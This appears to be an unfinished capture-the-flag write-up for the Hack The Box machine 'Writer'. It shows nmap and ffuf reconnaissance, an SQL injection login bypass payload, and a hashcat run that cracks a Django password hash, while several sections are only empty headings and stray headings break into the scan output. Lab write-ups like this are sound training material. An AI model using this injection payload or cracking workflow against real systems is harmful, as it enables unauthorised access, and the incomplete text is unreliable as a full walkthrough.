# Port Scanning 
`nmap` found 4 open TCP ports, SSH (22) , HTTP (80) , SMB (139,445):

```bash
# Nmap 7.91 scan initiated Sun Aug  1 08:48:33 2021 as: nmap -sC -sV -oN inital_scan.txt -v 10.10.11.101
Nmap scan report for 10.10.11.101
Host is up (0.058s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 98:20:b9:d0:52:1f:4e:10:3a:4a:93:7e:50:bc:b8:7d (RSA)
|   256 10:04:79:7a:29:74:db:28:f9:ff:af:68:df:f1:3f:34 (ECDSA)
|_  256 77:c4:86:9a:9f:33:4f:da:71:20:2c:e1:51:10:7e:8d (ED25519)
80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Story Bank | Writer.HTB
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| nbstat: NetBIOS name: WRITER, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   WRITER<00>           Flags: <unique><active>
|   WRITER<03>           Flags: <unique><active>
|   WRITER<20>           Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active># Knowledge Gained

# Port Scanning
|_  WORKGROUP<1e>        Flags: <group><active>
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-08-01T02:48:47
|_  start_date: N/A

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Aug  1 08:48:50 2021 -- 1 IP address (1 host up) scanned in 16.78 seconds

```

# Web Reconnaissance
I added writer.htb in `/etc/hosts` file with associated IP address. I visited `http://writer.htb` and it returns this:

![web_root](https://github.com/binsec01/progress/raw/main/screenshots/writer-web_root.png)
###### Content Discovery:
I used `ffuf`  for fuzzing web contents.
```bash
$ ffuf -w /opt/SecLists/Discovery/Web-Content/common.txt  -u http://writer.htb/FUZZ         

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.2.1
________________________________________________

 :: Method           : GET
 :: URL              : http://writer.htb/FUZZ
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

contact                 [Status: 200, Size: 4899, Words: 242, Lines: 110]
logout                  [Status: 302, Size: 208, Words: 21, Lines: 4]
about                   [Status: 200, Size: 3522, Words: 250, Lines: 75]
static                  [Status: 301, Size: 309, Words: 20, Lines: 10]
dashboard               [Status: 302, Size: 208, Words: 21, Lines: 4]
server-status           [Status: 403, Size: 275, Words: 20, Lines: 10]
administrative          [Status: 200, Size: 1443, Words: 185, Lines: 35]
:: Progress: [4685/4685] :: Job [1/1] :: 388 req/sec :: Duration: [0:00:11] :: Errors: 0 ::
```

![[writer-admin_login_page.png]]
<center>writer.htb/administrative</center>

# Exploitation
I tried some random username password combination. but did't work! Then I put SQLi Payload and bypassed Admin Login.
```sqli
username = admin' -- -
password = admin' -- -
```
![[writer-SQLi.png]]

Admin Dashboard Screenshot:

![[writer-admin_panel_bypass_with_SQLi.png]]

-------------
 I send admin login request to burp for harvesting database info.  There was total 6 columns and 2nd column executes our SQL Query.

 ![[writer-vulnerable_column.png]]
# Reverse shell as www-data

# Post-Exploitation
- From www-data shell to $USER

# Privilege Escalation
- Enumeration

# Gainning Root User

Apache2 Domain Mapping Config PATH :  `/etc/apache2/sites-enabled/000-default.conf`

```bash
─$ hashcat -m 10000 hashes.txt /usr/share/wordlists/rockyou.txt --force                                                                                                                                                          2 ⨯
hashcat (v6.1.1) starting...

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.
CUDA API (CUDA 11.4)
====================
* Device #1: NVIDIA GeForce GT 1030, 1533/2000 MB, 3MCU

OpenCL API (OpenCL 3.0 CUDA 11.4.94) - Platform #1 [NVIDIA Corporation]
=======================================================================
* Device #2: NVIDIA GeForce GT 1030, skipped

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt
* Slow-Hash-SIMD-LOOP

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 116 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

Cracking performance lower than expected?

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A=:marcoantonio

Session..........: hashcat
Status...........: Cracked
Hash.Name........: Django (PBKDF2-SHA256)
Hash.Target......: pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8...uXM4A=
Time.Started.....: Mon Sep 27 16:50:00 2021, (18 secs)
Time.Estimated...: Mon Sep 27 16:50:18 2021, (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      670 H/s (8.91ms) @ Accel:4 Loops:128 Thr:1024 Vec:1
Recovered........: 1/1 (100.00%) Digests
Progress.........: 12288/14344385 (0.09%)
Rejected.........: 0/12288 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:259968-259999
Candidates.#1....: 123456 -> hawkeye
Hardware.Mon.#1..: Temp: 65c Fan: 55% Util:100% Core:1746MHz Mem:3003MHz Bus:4

Started: Mon Sep 27 16:49:59 2021
Stopped: Mon Sep 27 16:50:19 2021
```
